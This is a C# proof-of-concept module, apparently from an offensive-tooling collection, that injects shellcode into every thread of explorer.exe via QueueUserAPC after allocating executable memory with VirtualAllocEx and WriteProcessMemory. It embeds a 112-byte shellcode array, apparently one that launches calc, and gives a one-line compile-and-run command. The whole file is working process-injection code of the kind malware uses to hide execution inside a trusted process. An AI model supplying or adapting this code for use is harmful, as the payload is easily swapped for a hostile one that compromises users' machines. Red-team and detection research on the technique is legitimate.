// APC injection into any process by @pwndizzle
// In this module I use QueueAPC to assign every thread in a specific process an APC to execute
// For threads to execute APCs the thread must enter the "alertable" state. I couldn't find any way to force this (aside from thread hijacking)
// Luckily threads in explorer very often are alertable making it the perfect target for exploitation
//
// TODO: Find a clean way to trigger alertable state
//
// To run:
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe apc-injection-any-process.cs && apc-injection-any-process.exe


using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;


public class ApcInjectionAnyProcess
{
	public static void Main()
	{	
		
		byte[] shellcode = new byte[112] {
		0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3
		};
		
		// Open process. "explorer" is a good target due to the large number of threads which will enter alertable state
		Process targetProcess = Process.GetProcessesByName("explorer")[0];
		IntPtr procHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

		// Allocate memory within process and write shellcode
		IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		IntPtr bytesWritten = IntPtr.Zero;
		bool resultBool = WriteProcessMemory(procHandle,resultPtr,shellcode,shellcode.Length, out bytesWritten);
		
		// Modify memory permissions on shellcode from XRW to XR
		uint oldProtect = 0;
		resultBool = VirtualProtectEx(procHandle, resultPtr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
		
		// Iterate over threads and queueapc
		foreach (ProcessThread thread in targetProcess.Threads)
                {
			//Get handle to thread
			IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
			
			//Assign APC to thread to execute shellcode
			IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
		  }
	}
	
	// Memory permissions
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	private static UInt32 PAGE_READWRITE = 0x04;
	private static UInt32 PAGE_EXECUTE_READ = 0x20;
	
	// Process privileges
      const int PROCESS_CREATE_THREAD = 0x0002;
      const int PROCESS_QUERY_INFORMATION = 0x0400;
      const int PROCESS_VM_OPERATION = 0x0008;
      const int PROCESS_VM_WRITE = 0x0020;
      const int PROCESS_VM_READ = 0x0010;
	
	[Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
	    THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }	
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
		int dwThreadId);
	
	[DllImport("kernel32.dll",SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
	
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
		 Int32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32.dll", SetLastError = true )]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
	Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
	int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
